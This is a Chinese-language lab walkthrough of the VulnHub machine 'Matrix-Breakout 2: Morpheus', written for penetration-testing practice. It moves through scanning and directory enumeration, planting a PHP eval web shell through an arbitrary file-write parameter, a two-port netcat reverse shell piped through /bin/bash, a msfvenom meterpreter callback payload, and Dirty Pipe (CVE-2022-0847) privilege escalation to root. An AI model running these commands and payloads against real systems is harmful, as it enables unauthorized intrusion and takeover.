攻击机：10.10.10.129

靶机：10.10.10.132

靶机下载地址：<https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/>

# 一、信息收集

1、`nmap -sn 10.10.10.0/24` 先用nmap扫下攻击机同网段，得到靶机地址10.10.10.132

![](./img/2716837929563152220.png)

2、`nmap -Pn -A -p- 10.10.10.132`，先用nmap进行初步的信息收集

![](./img/7362097646962598609.png)

3、开放了3个端口，22端口没有发现利用点。80端口是一个网页，只有一段话和一张图片。81端口是个登录界面。

![](./img/3332168825331141604.png)

![](./img/8567029864502404161.png)

4、80端口界面看了下源码没发现利用点，简单进行下目录扫描

![](./img/5849833473511058996.png)

5、80端口界面暂未发现什么可利用目录，先放着。81端口界面是个登录界面可能存在账号爆破或sql注入。进行一番测试和爆破后还有没有新发现。于是对81端口界面也进行了一波目录扫描，依旧没有新发现

![](./img/7464930096794934241.png)

6、既然81端口登录界面不是突破口，估计又是存在某个隐藏目录。于是使用kali上自带的字典重新进行了一波目录扫描，`dirsearch -u
http://10.10.10.132/ -w /usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt -t 100 -o 1.txt`

![](./img/2570547363918173389.png)

![](./img/267414677176724568.png)

7、依旧没扫出来，于是打算换个字典试一下，结果所有字典都试了也没有新发现。然后就想着进行一波指纹扫描，也许是利用什么cms漏洞之类的

![](./img/7297667201008795771.png)

![](./img/8466775206808783613.png)

8、依旧是没有什么新进展，然后去看了下别人的write
up，别人就是扫出了一个隐藏文件。这里一直想不明白我怎么扫不出来，后来才发现我使用的dirsearch
扫描时没有将后缀名拼接扫描文件，只扫描了目录。于是改用了gobuster重新进行扫描。gobuster
需要指定文件类型，由于不知道网站使用什么语言所以都指定了一遍。`gobuster dir -u http://10.10.10.132 -w
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x
php,html,txt,jsp,aspx,asp,js`

![](./img/8467474569183973854.png)

9、扫出来两个文件，graffiti.txt目前没啥利用点。graffiti.php有一个输入框

![](./img/6913421756145080585.png)

![](./img/2412152045477759845.png)

# 二、漏洞利用

1、经测试在文本框输入会直接在当前页面打印出来，而且存在存储型xss。试着写了一句话木马过去，但查看网页源码发现会在<?之间插入!--，使之成为一个注释

![](./img/3630936028968705546.png)

2、然后找了个不用？的一句话木马，虽然没有被过滤但是无法连接`<script language="pHp">@eval(['a'])</script>`

![](./img/6781427669910143939.png)

3、抓包看了下，发现请求包存在两个参数。一个是message，值是我们发送的信息；一个是file，file的值等于graffiti.txt。然后又重新查看了下graffiti.txt这个文件，发现之前测试的数据都被写进了这里

![](./img/3160863572738947999.png)

![](./img/4756667960907432275.png)

4、将file的值改成graffiti.php重新写入一句话木马，蚁剑成功上线。后面测试如果将file的值改成一个不存在文件名，它会自动生成这个文件，也可以成功上线

![](./img/698241394676977781.png)

![](./img/5667028671158256063.png)

# 三、内网信息收集

1、简单查了下当前用户信息

![](./img/1219197850982699325.png)

2、查看了下passwd、shadow文件权限都为root

![](./img/1729018174467110525.png)

3、`find / -perm -u=s -type f 2>/dev/null`，没发现可以suid提权的命令

![](./img/7419760720065004596.png)

4、`sudoeidt -s /`，suodo提权也无法使用

![](./img/3220573466955901940.png)

5、这里可以直接上传linux提权辅助工具来寻找其他漏洞提权，linux提权辅助工具下载地址：<https://github.com/The-Z-Labs/linux-exploit-suggester，但我比较喜欢使用msf中的local_exploit_suggester>
这个模块来辅助提权。如果是直接上传的话，后面如果要反弹shell到攻击机上，靶机上nc反弹无法使用e参数。这里介绍一个新的nc反弹，不需要e参数。首先在攻击机上用nc开启两个监听端口。

![](./img/514726545290718153.png)

![](./img/6711894370992967281.png)

6、`nc 10.10.10.129 4444 | /bin/bash | nc 10.10.10.129
5555`，在蚁剑上执行就可以成功反弹shell。在4444端口输入命令，5555端口显示结果

![](./img/642336390910903758.png)

![](./img/2765914237878346897.png)

![](./img/7194742473478622290.png)

# 四、权限提升

1、首先在msf中开启一个监听端口

![](./img/8721428895885580448.png)

![](./img/4769490678235097150.png)

2、`msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.10.129 lport=4444
-f elf >
4444.elf`，生成一个msf的木马，payload要与上面监听事件的payload相同。然后上传到靶机执行。一般tmp目录拥有高权限，所以上传到tmp目录下执行

![](./img/5814513230388637133.png)

![](./img/1729645104474329217.png)

![](./img/282026805254937181.png)

3、成功上线后，输入bg先将这个会话放后台。然后使用msf中的提权辅助模块

![](./img/7479915073078287860.png)

4、设置下必要参数然后执行等待

![](./img/322746335150674945.png)

5、这里使用第一个漏洞模块

![](./img/1412200738842151298.png)

6、`use exploit/linux/local/cve_2022_0847_dirtypipe`

![](./img/7946796751376754587.png)

7、设置下必要参数，下面payload的端口需要改下，4444端口已经被我们使用了

![](./img/5882678604403678044.png)

# 五、get flag

1、获得会话后，查看下权限是root。切换到shell模式，然后在root目录下获得flag

![](./img/141847571133298444.png)

# 六、总结

这个靶机还是挺简单的，先目录扫描出隐藏文件，然后上传木马getshell，最后借助msf使用cve-2022-0847提权获得flag。难点可能在于那个隐藏文件扫不出来，还有学习了nc不用e参数反弹shell。

